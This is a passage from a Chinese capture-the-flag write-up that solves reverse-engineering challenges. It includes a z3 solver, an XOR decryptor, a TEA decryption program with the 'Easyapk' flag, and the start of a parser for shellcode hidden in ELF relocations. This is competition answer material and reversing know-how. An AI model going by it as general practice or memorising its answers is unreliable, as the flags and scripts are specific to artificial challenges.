</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> (((y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">^</span> y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> y <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    z <span style="color:#f92672">=</span> (((z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span> <span style="color:#f92672">^</span> z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">^</span> z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">29</span> <span style="color:#f92672">^</span> z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">28</span> <span style="color:#f92672">^</span> z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">^</span> z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">|</span> z <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> ((z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> (x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">^</span> ((((z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> ((y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(cur <span style="color:#f92672">==</span> (flag1[i <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>check() <span style="color:#f92672">==</span> sat:
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
</span></span><span style="display:flex;"><span>    print (m)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#39;no res&#39;</span>)
</span></span></code></pre></div><p>求解，或动调改内存</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>array <span style="color:#f92672">=</span> [<span style="color:#ae81ff">156324965</span>, <span style="color:#ae81ff">868387187</span>, <span style="color:#ae81ff">3131229747</span>]
</span></span><span style="display:flex;"><span>Key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        Key[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> j] <span style="color:#f92672">=</span> (array[i] <span style="color:#f92672">&gt;&gt;</span> (j <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (Key)
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">227</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(cipher)):
</span></span><span style="display:flex;"><span>    print (chr(cipher[i] <span style="color:#f92672">^</span> Key[i <span style="color:#f92672">%</span> len(Key)]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span></code></pre></div><h3 id="easyapk">Easyapk</h3>
<p>逻辑在 so 层，有大量的垃圾指令，实际逻辑是先进行 rot13，再进行 tea 加密
解密脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;  </span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//解密函数  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0xC6EF3720</span>, i;  <span style="color:#75715e">/* set up */</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9e3779b9</span>;                     <span style="color:#75715e">/* a key schedule constant */</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];   <span style="color:#75715e">/* cache key */</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {                         <span style="color:#75715e">/* basic cycle start */</span>  
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">-=</span> ((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3);  
</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">-=</span> ((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1);  
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">-=</span> delta;  
</span></span><span style="display:flex;"><span>    }                                              <span style="color:#75715e">/* end cycle */</span>  
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;  
</span></span><span style="display:flex;"><span>}  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()  
</span></span><span style="display:flex;"><span>{  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1570024068u</span>, <span style="color:#ae81ff">351937696u</span>, <span style="color:#ae81ff">727056912u</span>, <span style="color:#ae81ff">3063668041u</span>, <span style="color:#ae81ff">2867849940u</span>, <span style="color:#ae81ff">1267528902u</span>, <span style="color:#ae81ff">159365321u</span>, <span style="color:#ae81ff">3052163538u</span>},k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x33323130</span>, <span style="color:#ae81ff">0x37363534</span>, <span style="color:#ae81ff">0x62613938</span>, <span style="color:#ae81ff">0x66656463</span>};  
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// v为要加密的数据是两个32位无符号整数  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;加密后的数据：%u %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>]);  
</span></span><span style="display:flex;"><span>    decrypt(v, k);  
</span></span><span style="display:flex;"><span>    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);  
</span></span><span style="display:flex;"><span>    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);  
</span></span><span style="display:flex;"><span>    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>x <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%x&#34;</span>, x[i]);
</span></span><span style="display:flex;"><span>    }  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  
</span></span><span style="display:flex;"><span>}  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// synt{Vg_Vf_A0g_guNg_zHpu_unEqre}
</span></span></span></code></pre></div><p>结果进行rot13即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>flag{It_Is_N0t_thAt_mUch_haRder}
</span></span></code></pre></div><h3 id="deeprev">deeprev</h3>
<p>将 shellcode 隐藏在了 relocation 中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> lief
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> namedtuple
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> dataclasses <span style="color:#f92672">import</span> dataclass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> lief<span style="color:#f92672">.</span>ELF<span style="color:#f92672">.</span>parse(<span style="color:#e6db74">&#39;./deeprev&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_sym</span>(name):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> len(name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ord(name[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Rel <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;REL&#39;</span>, [<span style="color:#e6db74">&#39;dst&#39;</span>, <span style="color:#e6db74">&#39;val&#39;</span>, <span style="color:#e6db74">&#39;ridx&#39;</span>])
</span></span><span style="display:flex;"><span>Copy <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;CPY&#39;</span>, [<span style="color:#e6db74">&#39;dst&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;ridx&#39;</span>])
</span></span><span style="display:flex;"><span>R64 <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;R64&#39;</span>, [<span style="color:#e6db74">&#39;dst&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;addend&#39;</span>, <span style="color:#e6db74">&#39;ridx&#39;</span>])
</span></span><span style="display:flex;"><span>R32 <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;R32&#39;</span>, [<span style="color:#e6db74">&#39;dst&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;addend&#39;</span>, <span style="color:#e6db74">&#39;ridx&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Symbol</span>(object):
</span></span><span style="display:flex;"><span>    idx: int
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;s</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Reloc</span>(object):
</span></span><span style="display:flex;"><span>    idx: int
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;r</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Ref</span>(object):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&amp;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>val<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SymAddr</span>(object):
</span></span><span style="display:flex;"><span>    sym: Symbol
</span></span><span style="display:flex;"><span>    field: str
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>sym<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>field<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RelocAddr</span>(object):
</span></span><span style="display:flex;"><span>    reloc: Reloc
</span></span><span style="display:flex;"><span>    field: str
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>reloc<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>field<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">vaddr</span>(self):
</span></span><span style="display:flex;"><span>        off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        print(self<span style="color:#f92672">.</span>field)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># match self.field:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#    case &#39;r_address&#39;: off = 0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#    case &#39;r_info&#39;: off = 8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#    case &#39;r_addend&#39;: off = 16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (self<span style="color:#f92672">.</span>reloc<span style="color:#f92672">.</span>idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">+</span> off <span style="color:#f92672">+</span> rela<span style="color:#f92672">.</span>virtual_address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@dataclass</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FlagAddr</span>(object):
</span></span><span style="display:flex;"><span>    idx: int
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __repr__(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;flag[</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BaseAddr <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;baseaddr&#39;</span>, [])
</span></span><span style="display:flex;"><span>CheckAddr <span style="color:#f92672">=</span> namedtuple(<span style="color:#e6db74">&#39;check&#39;</span>, [])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rela <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> b<span style="color:#f92672">.</span>sections <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.rela.dyn&#39;</span>][<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>dynsym <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> b<span style="color:#f92672">.</span>sections <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.dynsym&#39;</span>][<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format_addr</span>(addr: int):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">&gt;=</span> rela<span style="color:#f92672">.</span>virtual_address <span style="color:#f92672">and</span> addr <span style="color:#f92672">&lt;</span> rela<span style="color:#f92672">.</span>virtual_address <span style="color:#f92672">+</span> rela<span style="color:#f92672">.</span>size):
</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> rela<span style="color:#f92672">.</span>virtual_address
</span></span><span style="display:flex;"><span>        r_offset <span style="color:#f92672">=</span> (offset <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>        r_rem <span style="color:#f92672">=</span> offset <span style="color:#f92672">%</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> RelocAddr(Reloc(r_offset), <span style="color:#e6db74">&#39;r_address&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> RelocAddr(Reloc(r_offset), <span style="color:#e6db74">&#39;r_info&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> RelocAddr(Reloc(r_offset), <span style="color:#e6db74">&#39;r_addend&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> RelocAddr(Reloc(r_offset), r_rem)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> (addr <span style="color:#f92672">&gt;</span> dynsym<span style="color:#f92672">.</span>virtual_address
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">and</span> addr <span style="color:#f92672">&lt;</span> dynsym<span style="color:#f92672">.</span>virtual_address <span style="color:#f92672">+</span> dynsym<span style="color:#f92672">.</span>size
</span></span><span style="display:flex;"><span>          ):
</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> dynsym<span style="color:#f92672">.</span>virtual_address
</span></span><span style="display:flex;"><span>        r_offset <span style="color:#f92672">=</span> (offset <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>        r_rem <span style="color:#f92672">=</span> offset <span style="color:#f92672">%</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> SymAddr(Symbol(r_offset), <span style="color:#e6db74">&#39;st_name&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Symbol(r_offset)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r_rem <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> SymAddr(Symbol(r_offset), <span style="color:#e6db74">&#39;st_size&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> SymAddr(Symbol(r_offset), r_rem)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> addr <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x404040</span> <span style="color:#f92672">and</span> addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x404040</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x21</span>:
</span></span><span style="display:flex;"><span>        off <span style="color:#f92672">=</span> addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x404040</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FlagAddr(off)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x804000</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> BaseAddr()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x404064</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> CheckAddr()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse</span>(b) <span style="color:#f92672">-&gt;</span> list:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Loading relocations...&#39;</span>)
</span></span><span style="display:flex;"><span>    relocs <span style="color:#f92672">=</span> list(b<span style="color:#f92672">.</span>relocations)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Parsing...&#39;</span>)
</span></span><span style="display:flex;"><span>    instructions <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>, len(relocs)):
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> relocs[i]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            instructions<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>                R64(format_addr(r<span style="color:#f92672">.</span>address), to_sym(r<span style="color:#f92672">.</span>symbol<span style="color:#f92672">.</span>name), format_addr(r<span style="color:#f92672">.</span>addend), i))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>:  <span style="color:#75715e"># CPY</span>
</span></span><span style="display:flex;"><span>            instructions<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>                Copy(format_addr(r<span style="color:#f92672">.</span>address), to_sym(r<span style="color:#f92672">.</span>symbol<span style="color:#f92672">.</span>name), i))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:  <span style="color:#75715e"># REL</span>
</span></span><span style="display:flex;"><span>            instructions<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>                Rel(format_addr(r<span style="color:#f92672">.</span>address), format_addr(r<span style="color:#f92672">.</span>addend), i))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>:  <span style="color:#75715e"># R32</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># instructions.append(</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#    R32(r.address, to_sym(r.symbol.name), r.addend, i))</span>
</span></span><span style="display:flex;"><span>            instructions<span style="color:#f92672">.</span>append(R32(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> instructions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(instructions):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> op <span style="color:#f92672">in</span> instructions:
